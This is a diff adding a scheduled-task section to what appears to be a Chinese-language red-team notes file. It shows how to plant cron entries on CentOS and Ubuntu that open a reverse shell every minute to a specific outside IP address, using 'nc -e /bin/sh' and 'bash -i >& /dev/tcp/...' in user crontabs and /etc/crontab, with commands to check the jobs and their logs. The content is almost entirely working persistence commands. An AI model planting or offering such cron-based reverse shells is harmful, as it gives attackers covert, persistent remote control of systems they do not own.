@@ -1378,3 +1378,69 @@ cmd命令：arp -a
 
 更多参考：
 https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448906104&idx=1&sn=28a7f930bfe6dceb9cbaf766cd88903a&chksm=8b55c725bc224e3367472da3f53c5cab8222ea6d911f4acfbc6b0b40f00d3ec22afb4e9b523c&mpshare=1&scene=23&srcid=1014GENHUbEBt7ebU5aStebQ&sharer_sharetime=1634183093071&sharer_shareid=7d1af5f0f75b32f1bf352f4b949752e4#rd
+
+
+------------------------------------------------------------------------------------------
+计划任务
+
+Centos
+[root@localhost ~]# crontab -e                               #编辑计划任务(不需要用户名)
+* * * * * /usr/bin/nc 175.24.115.4 5555 -e /bin/sh
+[root@localhost ~]# cat /var/spool/cron/root                 #查看计划任务文件
+*/1 * * * * /usr/bin/nc 175.24.115.4 5555 -e /bin/sh
+[root@localhost ~]# cat /var/log/cron                         #查看日志
+还有其他添加任务方式：
+[root@localhost etc]# vi /etc/crontab
+[root@localhost etc]# cat /etc/crontab
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# For details see man 4 crontabs
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name  command to be executed
+#*/1 * * * * root /bin/bash -i >& /dev/tcp/175.24.115.4/5555 0>&1          #添加该行，需要用户名
+[root@localhost etc]#
+
+
+
+
+Ubuntu
+zhangxin@zhangxin-virtual-machine:~$ crontab -e             #编辑计划任务(不需要用户名)
+*/1 * * * *    /bin/bash -i >& /dev/tcp/175.24.115.4/5555 0>&1
+zhangxin@zhangxin-virtual-machine:~$ sudo cat /var/spool/cron/crontabs/zhangxin    #查看计划任务文件
+# m h  dom mon dow   command
+*/1 * * * *    /bin/bash -i >& /dev/tcp/175.24.115.4/5555 0>&1
+zhangxin@zhangxin-virtual-machine:~$ ln -s -f bash /bin/sh  #执行了该行才生效(不知道为什么)
+root@Ubuntu:log# tail -f /var/log/syslog                           #查看日志
+
+还有其他添加任务方式：
+zhangxin@zhangxin-virtual-machine:~$ sudo vi /etc/crontab             #直接编辑/etc/crontab文件
+zhangxin@zhangxin-virtual-machine:~$ sudo cat  /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/1 * * * * root /bin/bash -i >& /dev/tcp/175.24.115.4/5555 0>&1                #添加该行，需要用户名
+root@Ubuntu:log# tail -f /var/log/syslog                           #查看日志
+
+参考：
+https://www.yuque.com/tidesec/redteam/myy0vw
+
